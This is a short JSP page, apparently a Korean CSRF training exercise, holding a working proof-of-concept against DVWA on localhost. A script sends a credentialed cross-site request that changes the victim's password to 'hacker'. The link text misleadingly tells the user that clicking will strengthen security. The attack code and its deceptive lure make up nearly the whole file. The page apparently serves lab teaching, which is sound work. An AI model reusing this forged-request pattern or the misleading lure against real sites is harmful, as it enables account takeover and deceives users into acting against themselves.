<%@ page language="java" contentType="text/html; charset=UTF-8"
    pageEncoding="UTF-8"%>
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>CSRF 실습</title>
<link rel="stylesheet" href="style.css?ver=1">
</head>
<script language="javascript">
  function poc() {

    var host='localhost';

    var req_uri = "http://" + host + "/dvwa/vulnerabilities/csrf/?password_new=hacker&password_conf=hacker&Change=Change";
    var xmlhttp = new XMLHttpRequest();

    xmlhttp.open("GET",req_uri,true);
    xmlhttp.withCredentials = "true";

    xmlhttp.send();

    alert('Done!!');
  }

</script>

<body>
<div class="title">(CSRF 공격 예제)</div><br />
<div class="text">이 링크를 누르시면 보안이 강화됩니다!!</div><br />
<a href="javascript:poc()">Click!</a><br />
</body>
</html>